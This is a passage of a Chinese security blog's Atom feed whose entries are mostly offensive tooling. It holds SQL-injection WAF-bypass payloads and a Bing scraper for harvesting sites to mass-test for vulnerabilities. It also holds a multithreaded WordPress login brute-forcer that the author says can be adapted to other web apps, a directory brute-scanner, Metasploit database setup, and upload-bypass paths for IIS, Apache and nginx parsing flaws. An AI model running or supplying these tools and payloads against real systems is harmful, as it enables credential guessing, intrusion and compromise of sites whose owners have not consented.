class="line">使用长输入造成溢出：</span><br><span class="line"><span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span>)=(<span class="keyword">Select</span> <span class="number">0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>–</span><br><span class="line"><span class="keyword">url</span>编码：</span><br><span class="line"><span class="keyword">union</span>%<span class="number">2520</span><span class="keyword">select</span>%<span class="number">25201</span>,%<span class="number">2</span>f%<span class="number">2</span>a%<span class="number">21</span>table_name%<span class="number">2</span>a%<span class="number">2</span>f%<span class="number">2520</span>,<span class="number">3</span> </span><br><span class="line">宽字节编码</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;检测方法&quot;&gt;&lt;a href=&quot;#检测方法&quot; class=&quot;headerlink&quot; title=&quot;检测方法&quot;&gt;&lt;/a&gt;检测方法&lt;/h3&gt;&lt;p&gt;字符型需要先使用单引号闭合&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;‘&lt;/li&gt;
&lt;li&gt;and 1=1, and 1=2&lt;/li&gt;
&lt;l
    
    </summary>
    
    
      <category term="security" scheme="http://myt0.com/tags/security/"/>
    
      <category term="sqli" scheme="http://myt0.com/tags/sqli/"/>
    
  </entry>
  
  <entry>
    <title>python爬取inurl查询关键字的bing结果</title>
    <link href="http://myt0.com/2017/06/22/spider-bing-url-search-result-with-python/"/>
    <id>http://myt0.com/2017/06/22/spider-bing-url-search-result-with-python/</id>
    <published>2017-06-22T15:02:12.000Z</published>
    <updated>2017-06-26T13:28:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>为了测试某个漏洞，比如struts2漏洞，我们可能会批量抓取搜索引擎结果来测试，这里简单演示用python脚本来爬取这些bing搜索结果的url，其他搜索引擎类似</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> pq</span><br><span class="line"></span><br><span class="line">mutex = threading.Lock()</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">search_bing</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, q, page=<span class="number">1</span>, file=<span class="string">''</span>)</span>:</span></span><br><span class="line">        self.wd = q <span class="comment">#inurl search string</span></span><br><span class="line">        self.page = page <span class="comment"># page count</span></span><br><span class="line">        self.file = <span class="keyword">None</span> <span class="comment"># save file</span></span><br><span class="line">        <span class="keyword">if</span> file:</span><br><span class="line">            self.file = open(file,<span class="string">'a'</span>)</span><br><span class="line">        self.url = <span class="string">'http://cn.bing.com/search?q='</span> + q</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(self, pageNo)</span>:</span></span><br><span class="line">        res = requests.get(<span class="string">'%s&amp;first=%d'</span> % (self.url, pageNo*<span class="number">10</span>+<span class="number">1</span>))</span><br><span class="line">        pageNo = pageNo + <span class="number">1</span>    </span><br><span class="line">        p = pq(res.content) <span class="comment">#use pyquery to resolve every page content</span></span><br><span class="line">        cite = p.find(<span class="string">'cite'</span>) <span class="comment">#find all urls</span></span><br><span class="line">        mutex.acquire(<span class="number">1</span>)</span><br><span class="line">        print(<span class="string">'pageNo:'</span> + str(pageNo))</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> cite:</span><br><span class="line">            text = pq(n).text().replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">if</span> self.wd.replace(<span class="string">'inurl:'</span>,<span class="string">''</span>) <span class="keyword">in</span> text: <span class="comment">#check target inurl string exists in result url</span></span><br><span class="line">                <span class="keyword">if</span> self.file <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">                    self.file.write(text + <span class="string">'\n'</span>) <span class="comment">#write to file</span></span><br><span class="line">                print(text)</span><br><span class="line">        mutex.release()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        threads = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(int(self.page)):</span><br><span class="line">            t = threading.Thread(target=self.search, args=[i])</span><br><span class="line">            threads.append(t)</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> threads:</span><br><span class="line">            n.start()</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> threads:</span><br><span class="line">            n.join()</span><br><span class="line">        <span class="keyword">if</span> self.file <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            self.file.close()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    parse = argparse.ArgumentParser(description=<span class="string">'This program is to print urls in bing search result about inurl syntax search.'</span>)</span><br><span class="line">    parse.add_argument(<span class="string">'string'</span>, action=<span class="string">'store'</span>, help=<span class="string">'search string'</span>)</span><br><span class="line">    parse.add_argument(<span class="string">'-p'</span>, default=<span class="number">1</span>, dest=<span class="string">'page'</span>, action=<span class="string">'store'</span>, help=<span class="string">'page count'</span>)</span><br><span class="line">    parse.add_argument(<span class="string">'-o'</span>, dest=<span class="string">'file'</span>, action=<span class="string">'store'</span>, help=<span class="string">'output file'</span>, type=str)</span><br><span class="line">    args = vars(parse.parse_args())</span><br><span class="line">    sea = search_bing(args[<span class="string">'string'</span>], args[<span class="string">'page'</span>], args[<span class="string">'file'</span>])</span><br><span class="line">    sea.run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;为了测试某个漏洞，比如struts2漏洞，我们可能会批量抓取搜索引擎结果来测试，这里简单演示用python脚本来爬取这些bing搜索结果的url，其他搜索引擎类似&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td cla
    
    </summary>
    
    
      <category term="security" scheme="http://myt0.com/tags/security/"/>
    
      <category term="python" scheme="http://myt0.com/tags/python/"/>
    
      <category term="spider" scheme="http://myt0.com/tags/spider/"/>
    
  </entry>
  
  <entry>
    <title>python多线程破解form登录(wordpress)</title>
    <link href="http://myt0.com/2017/06/11/brute-form-with-python/"/>
    <id>http://myt0.com/2017/06/11/brute-form-with-python/</id>
    <published>2017-06-11T10:21:31.000Z</published>
    <updated>2017-06-11T10:38:28.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文代码参考自《Black Hat Python: Python Programming for Hackers and Pentesters》<br>原书使用urllib,urllib2,HTMLParser等库实现，这里我用requests请求，pyquery来解析，更加方便一点。<br>这里只要修改一下前面的几个参数即可使用于其他的web程序，原书本用于破解joomla，这里我们改成了wordpress。<br>书里的代码可以去<a href="https://github.com/coldhurt/pycode" target="_blank" rel="external">python代码仓库</a>查看，这里用到的dir_bruster那个函数也在里面，我会不断更新这个仓库，push一些学到的python代码，欢迎交流。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> pq</span><br><span class="line"><span class="keyword">from</span> dir_bruster <span class="keyword">import</span> build_wordlist</span><br><span class="line"></span><br><span class="line">thread_count = <span class="number">10</span></span><br><span class="line"><span class="comment">#login form url</span></span><br><span class="line">target_url = <span class="string">'http://192.168.99.196/wordpress/wp-login.php'</span></span><br><span class="line"><span class="comment">#login form action url</span></span><br><span class="line">target_post = <span class="string">'http://192.168.99.196/wordpress/wp-login.php'</span></span><br><span class="line">username_field = <span class="string">'log'</span></span><br><span class="line">password_field = <span class="string">'pwd'</span></span><br><span class="line">username = <span class="string">'admin'</span></span><br><span class="line">wordlist = build_wordlist(<span class="string">'./pwd.txt'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bruster</span><span class="params">(object)</span>:</span></span><br><span class="line"><span class="string">'''</span><br><span class="line">    Brute web form using requests and pyquery</span><br><span class="line">    This example is for wordpress, you can change these global params to brute other web app:)</span><br><span class="line">'''</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, username, wordlist)</span>:</span></span><br><span class="line">        self.username = username</span><br><span class="line">        self.wordlist = wordlist</span><br><span class="line">        self.found = <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_brust</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> range(thread_count):</span><br><span class="line">            t = threading.Thread(target=self.brust_form)</span><br><span class="line">            t.start()</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">brust_form</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.wordlist.empty() <span class="keyword">and</span> <span class="keyword">not</span> self.found:</span><br><span class="line">            pwd = self.wordlist.get()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                s = requests.Session()</span><br><span class="line">                res = s.get(target_url)</span><br><span class="line">                body = self.parse(res.text)</span><br><span class="line">                body[username_field] = self.username</span><br><span class="line">                body[password_field] = pwd</span><br><span class="line"></span><br><span class="line">                print(<span class="string">'Trying %s:%s (%d left)'</span> % (self.username, pwd, self.wordlist.qsize()))</span><br><span class="line">                result = s.post(target_post, data=body)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'密码不正确'</span> <span class="keyword">not</span> <span class="keyword">in</span> result.content:</span><br><span class="line">                    self.found = <span class="keyword">True</span></span><br><span class="line">                    print(<span class="string">'Brute successful by %s:%s'</span> % (self.username, pwd))</span><br><span class="line">            <span class="keyword">except</span> requests.ConnectionError <span class="keyword">as</span> e:</span><br><span class="line">                print(e)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self, page)</span>:</span></span><br><span class="line">        <span class="string">'''</span><br><span class="line">            create post body</span><br><span class="line">        '''</span></span><br><span class="line">        par = pq(page)</span><br><span class="line">        inputs = par.find(<span class="string">'input'</span>)</span><br><span class="line">        body = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> inputs:</span><br><span class="line">            <span class="keyword">if</span> n.name <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">                body[n.name] = <span class="string">''</span></span><br><span class="line">            <span class="keyword">if</span> n.value <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">                body[n.name] = n.value</span><br><span class="line">        <span class="keyword">return</span> body</span><br><span class="line"></span><br><span class="line">b = Bruster(username, wordlist)</span><br><span class="line">b.run_brust()</span><br></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文代码参考自《Black Hat Python: Python Programming for Hackers and Pentesters》&lt;br&gt;原书使用urllib,urllib2,HTMLParser等库实现，这里我用requests请求，pyquery来解析，更
    
    </summary>
    
    
      <category term="security" scheme="http://myt0.com/tags/security/"/>
    
      <category term="python" scheme="http://myt0.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>metasploit配置postgresql</title>
    <link href="http://myt0.com/2017/06/10/metasploit-and-postgresql-config/"/>
    <id>http://myt0.com/2017/06/10/metasploit-and-postgresql-config/</id>
    <published>2017-06-10T01:53:12.000Z</published>
    <updated>2017-06-10T02:23:38.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="创建用户和数据库"><a href="#创建用户和数据库" class="headerlink" title="创建用户和数据库"></a>创建用户和数据库</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#启动postgresql</span><br><span class="line">systemctl start postgresql.service</span><br><span class="line"></span><br><span class="line">#切换到postgres</span><br><span class="line">sudo su postgres</span><br><span class="line"></span><br><span class="line">#创建user</span><br><span class="line">createuser msf -P</span><br><span class="line"></span><br><span class="line">#创建数据库并指定拥有者</span><br><span class="line">createdb msfdb --owner=msf</span><br></pre></td></tr></table></figure>
<h2 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db_connect　msfuser:msfpassword@localhost/msfdb</span><br></pre></td></tr></table></figure>
<p>或者修改metasploit目录下的database.yml</p>
<h2 id="postgresql一些命令"><a href="#postgresql一些命令" class="headerlink" title="postgresql一些命令"></a>postgresql一些命令</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#查看数据库</span><br><span class="line">psql -l</span><br><span class="line"></span><br><span class="line">#改变数据库owner</span><br><span class="line">psql -c "ALTER DATABASE msf_database OWNER TO msf_user;"</span><br><span class="line"></span><br><span class="line">#为一个数据库用户添加或修改密码</span><br><span class="line">psql -c "ALTER USER msf_user WITH ENCRYPTED PASSWORD 'omgwtfbbq';"</span><br><span class="line"></span><br><span class="line">#连接</span><br><span class="line">psql -U user -d db -h host</span><br><span class="line"></span><br><span class="line">#删除用户</span><br><span class="line">dropuser msf</span><br><span class="line"></span><br><span class="line">#删除数据库</span><br><span class="line">dropdb msf</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;创建用户和数据库&quot;&gt;&lt;a href=&quot;#创建用户和数据库&quot; class=&quot;headerlink&quot; title=&quot;创建用户和数据库&quot;&gt;&lt;/a&gt;创建用户和数据库&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td cl
    
    </summary>
    
    
      <category term="security" scheme="http://myt0.com/tags/security/"/>
    
      <category term="metasploit" scheme="http://myt0.com/tags/metasploit/"/>
    
      <category term="tools" scheme="http://myt0.com/tags/tools/"/>
    
  </entry>
  
  <entry>
    <title>python多线程扫描网站路径</title>
    <link href="http://myt0.com/2017/06/04/python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%89%AB%E6%8F%8F%E7%BD%91%E7%AB%99%E8%B7%AF%E5%BE%84/"/>
    <id>http://myt0.com/2017/06/04/python多线程扫描网站路径/</id>
    <published>2017-06-04T14:19:52.000Z</published>
    <updated>2017-06-04T16:18:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文代码参考自《Black Hat Python: Python Programming for Hackers and Pentesters》</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">resume = <span class="keyword">None</span></span><br><span class="line">mutex = threading.Lock()</span><br><span class="line">user_agent = <span class="string">'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.96 Safari/537.36'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_wordlist</span><span class="params">(wordlist)</span>:</span></span><br><span class="line">    <span class="string">'''Create Queue of file wordlist</span><br><span class="line"></span><br><span class="line">    Args:</span><br><span class="line">        wordlist: file path of the wordlist</span><br><span class="line">    '''</span></span><br><span class="line">    fd = open(wordlist, <span class="string">'rb'</span>)</span><br><span class="line">    raw_words = fd.readlines()</span><br><span class="line">    fd.close()</span><br><span class="line"></span><br><span class="line">    found_resume = <span class="keyword">False</span></span><br><span class="line">    words = Queue.Queue()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> raw_words:</span><br><span class="line">        word = word.rstrip()</span><br><span class="line">        <span class="keyword">if</span> resume <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">if</span> found_resume:</span><br><span class="line">                words.put(word)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> word == resume:</span><br><span class="line">                    found_resume = <span class="keyword">True</span></span><br><span class="line">                    print(<span class="string">'Resuming wordlist from : %s'</span> % resume)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            words.put(word)</span><br><span class="line">    <span class="keyword">return</span> words</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dir_bruster</span><span class="params">(target, word_queue, extensions=None)</span>:</span></span><br><span class="line">    <span class="string">'''Scan target use wordlist queue and extendsions</span><br><span class="line"></span><br><span class="line">    Args:</span><br><span class="line">        target: target url</span><br><span class="line">        word_queue: a Queue obj created by build_wordlist function</span><br><span class="line">        extensions: some extension, a list or tuple</span><br><span class="line">    '''</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> word_queue.empty():</span><br><span class="line">        path = word_queue.get()</span><br><span class="line">        paths = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'.'</span> <span class="keyword">not</span> <span class="keyword">in</span> path:</span><br><span class="line">            paths.append(<span class="string">'/%s/'</span> % path)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            paths.append(<span class="string">'/%s'</span> % path)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> extensions:</span><br><span class="line">            <span class="keyword">for</span> ext <span class="keyword">in</span> extensions:</span><br><span class="line">                <span class="keyword">if</span> ext.startswith(<span class="string">'.'</span>):</span><br><span class="line">                    paths.append(<span class="string">'/%s%s'</span> % (path, ext))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    paths.append(<span class="string">'/%s.%s'</span> % (path, ext))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> brust <span class="keyword">in</span> paths:</span><br><span class="line">            url = <span class="string">'%s%s'</span> % (target, urllib.quote(brust)) <span class="comment">#urllib.quote can encode request path to support Chinese or other language</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                headers = &#123;&#125;</span><br><span class="line">                headers[<span class="string">'user-agent'</span>] = user_agent</span><br><span class="line">                r = urllib2.Request(url, headers=headers) <span class="comment"># create request through url and headers</span></span><br><span class="line">                res = urllib2.urlopen(r) <span class="comment">#urlopen send request</span></span><br><span class="line">                <span class="keyword">if</span> len(res.read()) <span class="keyword">and</span> mutex.acquire(<span class="number">1</span>):</span><br><span class="line">                    print(<span class="string">'[%d] =&gt; %s'</span> % (res.code, url))</span><br><span class="line">                    mutex.release()</span><br><span class="line">            <span class="keyword">except</span> urllib2.HTTPError <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">if</span> hasattr(e, <span class="string">'code'</span>) <span class="keyword">and</span> e.code != <span class="number">404</span>:</span><br><span class="line">                    print(<span class="string">'!!! %d =&gt; %s'</span> % (e.code, url))</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    parse = argparse.ArgumentParser(description=<span class="string">'A dir scanner'</span>)</span><br><span class="line">    parse.add_argument(<span class="string">'url'</span>, action=<span class="string">'store'</span>, help=<span class="string">'target url'</span>)</span><br><span class="line">    parse.add_argument(<span class="string">'-w'</span>, required=<span class="keyword">True</span>, dest=<span class="string">'wordlist'</span>, action=<span class="string">'store'</span>, help=<span class="string">'wordlist path'</span>)</span><br><span class="line">    parse.add_argument(<span class="string">'-t'</span>, dest=<span class="string">'threads'</span>, action=<span class="string">'store'</span>, help=<span class="string">'thread count'</span>, type=int, default=<span class="number">10</span>)</span><br><span class="line">    parse.add_argument(<span class="string">'-e'</span>, dest=<span class="string">'extensions'</span>, action=<span class="string">'store'</span>, help=<span class="string">'extensions, eg: "php,asp"'</span>, default=<span class="string">''</span>)</span><br><span class="line">    args = vars(parse.parse_args())</span><br><span class="line">    <span class="keyword">global</span> target,wordlist,threads,ext</span><br><span class="line">    target, wordlist, threads, ext = args[<span class="string">'url'</span>], args[<span class="string">'wordlist'</span>], args[<span class="string">'threads'</span>], \</span><br><span class="line">    args[<span class="string">'extensions'</span>].split(<span class="string">','</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> target.startswith(<span class="string">"http://"</span>):</span><br><span class="line">        target = <span class="string">'http://%s'</span> % target</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(wordlist):</span><br><span class="line">        word_queue = build_wordlist(wordlist)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(threads):</span><br><span class="line">            t = threading.Thread(target=dir_bruster, args=(target, word_queue, ext))</span><br><span class="line">            t.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文代码参考自《Black Hat Python: Python Programming for Hackers and Pentesters》&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutte
    
    </summary>
    
    
      <category term="security" scheme="http://myt0.com/tags/security/"/>
    
      <category term="python" scheme="http://myt0.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>解析漏洞</title>
    <link href="http://myt0.com/2017/01/19/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
    <id>http://myt0.com/2017/01/19/解析漏洞/</id>
    <published>2017-01-18T16:16:30.000Z</published>
    <updated>2017-06-04T14:03:46.000Z</updated>
    
    <content type="html"><![CDATA[<p>iis6.0:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/1.asp/1.jpg</span><br><span class="line">/1.asp;1.jpg</span><br></pre></td></tr></table></figure></p>
<p>apache:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/1.php.rar  //从右往左解析至可以解析的格式</span><br></pre></td></tr></table></figure></p>
<p>phpcgi解析漏洞，常见于nginx，由于配置文件中的选项cgi.fi:x_pathinfo在某些版本中默认开启而导致：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/1.jpg/1.php  //1.php并不存在，而这样的请求却会导致1.jpg按照php解析</span><br></pre></td></tr></table></figure></p>
<p>nginx&lt;8.03空字节代码执行漏洞，Nginx在图片中嵌入PHP代码然后访问/1.jpg%00.php</p>
<p>在windows系统下，文件名以“.”或者空格结尾系统会自动去除.与空格，利用此特性可绕过黑名单验证</p>
]]></content>
    
    <summary type="html">
    
